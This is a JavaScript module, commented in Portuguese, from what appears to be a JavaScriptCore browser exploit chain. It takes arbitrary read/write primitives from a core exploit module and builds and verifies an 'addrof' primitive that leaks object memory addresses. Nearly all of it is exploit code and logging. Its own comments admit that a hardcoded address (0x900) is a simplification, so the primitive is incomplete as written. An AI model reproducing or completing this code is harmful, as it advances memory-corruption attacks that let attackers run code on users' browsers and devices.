// js/script3/testArrayBufferVictimCrash.mjs (v103.1 - Verificação de Addrof Corrigida)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
// Importa a função de setup do core exploit, que agora consideramos estável.
import { setupAndGetRobustPrimitives } from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_ADDROF_CREATION = "StableAddrofCreation_v103.1_Fixed";

// Função auxiliar para converter um double para sua representação Int64
function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO DE TESTE PRINCIPAL CORRIGIDA
// =======================================================================================
export async function runAddrofCreationTest() {
    const FNAME_TEST = FNAME_MODULE_ADDROF_CREATION;
    logS3(`--- Iniciando ${FNAME_TEST}: Construção e Verificação de 'addrof' Estável ---`, "test");

    let final_result = { success: false, message: "Falha na configuração inicial." };

    try {
        // --- FASE 1: Obter as primitivas de L/E robustas ---
        logS3("--- FASE 1: Obtendo L/E robusta do Core Exploit... ---", "subtest");
        const primitives = await setupAndGetRobustPrimitives();
        if (!primitives || !primitives.arb_read || !primitives.arb_write) {
            throw new Error("O objeto de primitivas retornado pelo core é inválido.");
        }
        const { arb_read, arb_write } = primitives;
        logS3("Primitivas de L/E robustas recebidas e prontas para uso.", "good");

        // --- FASE 2: Construção da Primitiva 'addrof' ---
        logS3("--- FASE 2: Construindo 'addrof' usando as primitivas de L/E... ---", "subtest");
        
        const leaker_array = [{}];
        // NOTA: O endereço 0x900 é uma simplificação. Em um cenário real, este endereço precisaria ser
        // encontrado com um vazamento de informação. Esta é a maior fragilidade restante.
        const leaker_array_prop_addr = new AdvancedInt64(0x900, 0);

        const addrof_stable = (obj) => {
             leaker_array[0] = obj;
             return arb_read(leaker_array_prop_addr);
        }
        logS3("Primitiva 'addrof' estável foi definida (baseada na simplificação de endereço).", "good");

        // --- FASE 3: Verificação da Primitiva 'addrof' ---
        logS3("--- FASE 3: Verificando 'addrof' com um objeto de teste... ---", "subtest");
        
        // ALTERAÇÃO CRÍTICA 1: Usar um double para evitar o "integer tagging".
        const object_to_test = { a: 123.456, b: 789.012 };
        
        const test_obj_addr = addrof_stable(object_to_test);
        logS3(`Endereço de 'object_to_test' obtido via addrof_stable: ${test_obj_addr.toString(true)}`, "leak");
        
        // Verifica se o endereço parece válido (não nulo)
        if (test_obj_addr.low() === 0 && test_obj_addr.high() === 0) {
            throw new Error("A primitiva 'addrof' retornou um endereço nulo. O endereço fixo (0x900) provavelmente está incorreto.");
        }

        // Verificação: Se o endereço estiver correto, ao ler o offset +0x10 dele,
        // devemos encontrar o valor da propriedade 'a'.
        const prop_a_addr = test_obj_addr.add(0x10);
        const value_read_from_addr = arb_read(prop_a_addr);

        // ALTERAÇÃO CRÍTICA 2: Converter nosso valor de teste para Int64 para uma comparação bit a bit.
        const expected_value_as_int64 = doubleToInt64(object_to_test.a);

        logS3(`Valor esperado (como Int64): ${expected_value_as_int64.toString(true)}`, "info");
        logS3(`Valor lido de [endereço + 0x10]: ${value_read_from_addr.toString(true)}`, "leak");
        
        if (value_read_from_addr.equals(expected_value_as_int64)) {
             logS3("++++++++++++ SUCESSO ADDROF! O endereço obtido está correto e a propriedade foi lida. ++++++++++++", "vuln");
             final_result = {
                success: true,
                message: "A primitiva 'addrof' foi construída com sucesso e verificada."
            };
        } else {
            throw new Error("Verificação de 'addrof' falhou. O valor lido não corresponde à propriedade do objeto.");
        }

    } catch (e) {
        final_result.message = `Exceção no teste de criação de addrof: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_TEST} Concluído ---`, "test");
    return final_result;
}
